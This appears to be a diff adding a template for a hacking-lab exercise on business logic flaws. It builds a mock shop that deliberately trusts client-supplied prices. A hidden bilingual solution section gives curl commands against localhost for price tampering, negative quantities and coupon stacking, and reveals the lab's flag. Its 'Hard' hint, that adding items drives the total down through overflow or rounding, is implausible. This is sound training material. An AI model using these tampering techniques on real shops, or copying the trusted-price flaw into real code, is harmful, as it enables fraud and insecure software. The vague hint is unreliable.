@@ -1,0 +1,225 @@
+{% extends "base.html" %}
+{% block title %}Business Logic Flaws – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}{% for category, msg in messages %}
+      <div class="alert-{{ category if category in ['success','warning','error'] else 'success' }} mb-4 text-sm font-mono">{{ msg }}</div>
+    {% endfor %}{% endif %}
+  {% endwith %}
+
+  <div class="hl-card mb-4">
+    <div class="flex items-center justify-between mb-4">
+      <h2 class="font-semibold text-sm" data-i18n="shop_catalog">Product Catalog</h2>
+      <span class="text-xs font-mono px-2 py-1 rounded" style="background:rgba(var(--hl-primary-rgb),.12);color:var(--hl-primary)">
+        <span data-i18n="shop_balance">Balance:</span>
+        <strong>${{ balance | default('1.00') }}</strong>
+      </span>
+    </div>
+
+    <div class="grid grid-cols-1 gap-3 sm:grid-cols-3">
+      <!-- Product 1 -->
+      <div class="rounded-lg p-4 flex flex-col gap-3" style="border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.03)">
+        <div>
+          <div class="font-semibold text-sm" data-i18n="shop_prod1_name">HackLabs Pro License</div>
+          <div class="text-xs text-gray-400 mt-0.5" data-i18n="shop_prod1_desc">Full access to all labs</div>
+        </div>
+        <div class="text-lg font-bold font-mono" style="color:var(--hl-primary)">$99.99</div>
+        <form method="POST" action="/shop/cart/add">
+          <input type="hidden" name="product_id" value="1">
+          <input type="hidden" name="price" value="9999">
+          <div class="flex items-center gap-2 mb-2">
+            <label class="text-xs text-gray-400" data-i18n="shop_qty">Qty:</label>
+            <input type="number" name="qty" value="1" min="1"
+                   class="font-mono text-xs rounded px-2 py-1 w-16"
+                   style="background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:inherit">
+          </div>
+          <button type="submit" class="btn-primary w-full justify-center text-xs py-1.5" data-i18n="shop_add_btn">Add to Cart</button>
+        </form>
+      </div>
+
+      <!-- Product 2 -->
+      <div class="rounded-lg p-4 flex flex-col gap-3" style="border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.03)">
+        <div>
+          <div class="font-semibold text-sm" data-i18n="shop_prod2_name">Zero-Day Exploit Kit</div>
+          <div class="text-xs text-gray-400 mt-0.5" data-i18n="shop_prod2_desc">Simulated exploit framework</div>
+        </div>
+        <div class="text-lg font-bold font-mono" style="color:var(--hl-primary)">$49.99</div>
+        <form method="POST" action="/shop/cart/add">
+          <input type="hidden" name="product_id" value="2">
+          <input type="hidden" name="price" value="4999">
+          <div class="flex items-center gap-2 mb-2">
+            <label class="text-xs text-gray-400" data-i18n="shop_qty">Qty:</label>
+            <input type="number" name="qty" value="1" min="1"
+                   class="font-mono text-xs rounded px-2 py-1 w-16"
+                   style="background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:inherit">
+          </div>
+          <button type="submit" class="btn-primary w-full justify-center text-xs py-1.5" data-i18n="shop_add_btn">Add to Cart</button>
+        </form>
+      </div>
+
+      <!-- Product 3 -->
+      <div class="rounded-lg p-4 flex flex-col gap-3" style="border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.03)">
+        <div>
+          <div class="font-semibold text-sm" data-i18n="shop_prod3_name">VPN Service</div>
+          <div class="text-xs text-gray-400 mt-0.5" data-i18n="shop_prod3_desc">1-year anonymous VPN</div>
+        </div>
+        <div class="text-lg font-bold font-mono" style="color:var(--hl-primary)">$9.99</div>
+        <form method="POST" action="/shop/cart/add">
+          <input type="hidden" name="product_id" value="3">
+          <input type="hidden" name="price" value="999">
+          <div class="flex items-center gap-2 mb-2">
+            <label class="text-xs text-gray-400" data-i18n="shop_qty">Qty:</label>
+            <input type="number" name="qty" value="1" min="1"
+                   class="font-mono text-xs rounded px-2 py-1 w-16"
+                   style="background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:inherit">
+          </div>
+          <button type="submit" class="btn-primary w-full justify-center text-xs py-1.5" data-i18n="shop_add_btn">Add to Cart</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="shop_cart">Cart</h2>
+    {% if cart and cart|length > 0 %}
+    <ul class="space-y-1.5 font-mono text-xs mb-3">
+      {% for item in cart %}
+      <li class="flex justify-between">
+        <span class="text-gray-300">{{ item.name }} x{{ item.qty }}</span>
+        <span style="color:var(--hl-primary)">${{ '%.2f' | format(item.total / 100) }}</span>
+      </li>
+      {% endfor %}
+    </ul>
+    <div class="flex justify-between text-sm font-semibold border-t pt-2 mb-3" style="border-color:rgba(255,255,255,.1)">
+      <span data-i18n="shop_total">Total</span>
+      <span style="color:var(--hl-primary)">${{ '%.2f' | format(cart_total / 100) }}</span>
+    </div>
+    {% else %}
+    <p class="text-xs text-gray-500 italic mb-3" data-i18n="shop_cart_empty">Cart is empty.</p>
+    {% endif %}
+
+    <form method="POST" action="/shop/coupon" class="flex gap-2 mb-3">
+      <input type="text" name="code" placeholder="Coupon code (try LABS50)"
+             class="font-mono text-xs rounded-lg px-3 py-2 flex-1"
+             style="background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:inherit">
+      <button type="submit" class="btn-primary text-xs py-1.5 px-3" data-i18n="shop_apply_coupon">Apply</button>
+    </form>
+    {% if discount %}
+    <div class="alert-success mb-3 text-xs font-mono">Discount applied: {{ discount }}% off</div>
+    {% endif %}
+
+    <div class="flex gap-2">
+      <form method="POST" action="/shop/checkout" class="flex-1">
+        <button type="submit" class="btn-primary w-full justify-center" data-i18n="shop_checkout">Checkout</button>
+      </form>
+      <form method="POST" action="/shop/cart/clear">
+        <button type="submit" class="text-xs px-3 py-2 rounded-lg transition"
+                style="border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);cursor:pointer;color:inherit"
+                data-i18n="shop_clear_cart">Clear</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Manipulación de precio (client-side)</h3>
+    <p>El precio se envía como campo oculto en el formulario. El servidor confía en el precio del cliente.</p>
+    <ol>
+      <li>Inspecciona el formulario "Add to Cart". El campo <code>price</code> es un input hidden con el precio en céntimos.</li>
+      <li>Intercepta con Burp Suite o usa curl modificando el precio:
+        <pre>curl -X POST http://localhost:5000/shop/cart/add \
+  -b "session=TU_SESSION" \
+  -d "product_id=1&amp;price=1&amp;qty=1"</pre>
+      </li>
+      <li>Establece <code>price=1</code> (1 céntimo). Con balance de $1.00, el checkout funciona.</li>
+      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+    </ol>
+
+    <h3>Medium — Cantidad negativa o coupon stacking</h3>
+    <p>Añade un producto con cantidad negativa para restar del total, o aplica el mismo cupón múltiples veces.</p>
+    <ol>
+      <li>Cantidad negativa para reducir el total:
+        <pre>curl -X POST http://localhost:5000/shop/cart/add \
+  -b "session=TU_SESSION" \
+  -d "product_id=1&amp;qty=-1"</pre>
+      </li>
+      <li>O aplica el mismo cupón múltiples veces (50% + 50% = 100% de descuento):
+        <pre>curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
+curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
+curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
+      </li>
+      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+    </ol>
+
+    <h3>Hard — Workflow bypass</h3>
+    <p>Coupons se rastrean por sesión y los precios se validan en servidor. Usa el truco de redondeo de punto flotante o encadena operaciones de carrito.</p>
+    <ol>
+      <li>Añade artículos hasta que el total se redondee a ≤ $1.00 por truncamiento entero:
+        <pre>curl -X POST http://localhost:5000/shop/cart/add \
+  -b "session=SESS" \
+  -d "product_id=3&amp;qty=1"
+# Repite hasta que el total sea ≤ 100 céntimos por overflow/rounding</pre>
+      </li>
+      <li>Encadena: limpia el carrito entre requests para resetear el estado y probar distintos vectores:
+        <pre>curl -X POST http://localhost:5000/shop/cart/clear -b "session=SESS"</pre>
+      </li>
+      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+    </ol>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">DevTools</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Client-side price manipulation</h3>
+    <p>The price is sent as a hidden form field. The server trusts the client-supplied price.</p>
+    <ol>
+      <li>Inspect the "Add to Cart" form. The <code>price</code> field is a hidden input with the price in cents.</li>
+      <li>Intercept with Burp Suite or use curl to modify the price:
+        <pre>curl -X POST http://localhost:5000/shop/cart/add \
+  -b "session=YOUR_SESSION" \
+  -d "product_id=1&amp;price=1&amp;qty=1"</pre>
+      </li>
+      <li>Set <code>price=1</code> (1 cent). With a $1.00 balance, checkout succeeds.</li>
+      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+    </ol>
+
+    <h3>Medium — Negative quantity or coupon stacking</h3>
+    <p>Add a product with a negative quantity to subtract from the total, or apply the same coupon multiple times.</p>
+    <ol>
+      <li>Negative quantity to reduce the total:
+        <pre>curl -X POST http://localhost:5000/shop/cart/add \
+  -b "session=YOUR_SESSION" \
+  -d "product_id=1&amp;qty=-1"</pre>
+      </li>
+      <li>Or apply the same coupon multiple times (50% + 50% = 100% off):
+        <pre>curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
+curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
+curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
+      </li>
+      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+    </ol>
+
+    <h3>Hard — Workflow bypass</h3>
+    <p>Coupons are tracked per-session and prices are server-validated. Use floating-point rounding or chain cart operations.</p>
+    <ol>
+      <li>Add items until the total rounds down to ≤ $1.00 via integer truncation:
+        <pre>curl -X POST http://localhost:5000/shop/cart/add \
+  -b "session=SESS" \
+  -d "product_id=3&amp;qty=1"
+# Repeat until total is ≤ 100 cents due to overflow/rounding</pre>
+      </li>
+      <li>Chain: clear the cart between requests to reset state and test different vectors:
+        <pre>curl -X POST http://localhost:5000/shop/cart/clear -b "session=SESS"</pre>
+      </li>
+      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+    </ol>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">DevTools</span></div>
+  </div>
+</div>
+{% endblock %}
